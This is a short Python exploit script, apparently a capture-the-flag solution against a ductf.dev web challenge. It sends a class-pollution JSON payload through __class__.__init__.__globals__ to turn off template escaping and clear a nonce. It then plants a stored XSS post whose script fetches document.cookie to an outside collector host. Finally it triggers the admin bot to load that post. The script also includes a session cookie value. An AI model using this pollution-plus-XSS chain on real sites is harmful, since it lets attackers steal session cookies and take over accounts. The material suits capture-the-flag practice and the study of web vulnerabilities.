import requests

url = "https://web-co2v2-cd93cd63acfba451.2024.ductf.dev"

token = ".eJwljk2KAkEMRq8iWYsk1ZX66UN4gUGkkkrGgR6ErpZZiHe3ZVaPj_ct3hOuvrRxswHz1xMO2w74tTHat8ERzvft0Jbl_mf9BJfX5bjfVxs3mLf1Yfv66TCDOxZSco-ds1KzGkrlUpwyGnZUoUQqZjzlGDm1MgmFnEKXQsaEgrUiJ_bSc52y5mhFqqrmGjpOoQXhGJNGdBES-cjUnNXZSv2EXh_D1v8agtcbOHQ-5g.ZopGIw.SDCkylqC_IeExFrSEEYbM8NHUl0"

r = requests.post(
    f"{url}/save_feedback",
    cookies={"session": token},
    json={
        "title": "asdf", 
        "content": "asdf", 
        "rating": "12", 
        "referred": "asdf",
        "__class__": {"__init__": {"__globals__": {"TEMPLATES_ESCAPE_ALL": False, "SECRET_NONCE":"", "RANDOM_COUNT":0}}}
    }
)
print(r.text) 

r = requests.post(
    f"{url}/admin/update-accepted-templates",
    cookies={"session": token},
    json={
        "policy":"strict"
    }
)

print(r.text) 

nonce = "8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f1"

r = requests.post(
    f"{url}/create_post", 
    cookies={"session": token},
    data={
        "title": f"""<script nonce="{nonce}">/*""",  
        "content": f"""*/fetch("https://frsfggq.request.dreamhack.games/?c="+document.cookie)</script>""",
        "public": 1
    }
)

print(r.text)

# bot
r = requests.get(
    f"{url}/api/v1/report",
    cookies={"session": token}
)
print(r.text) 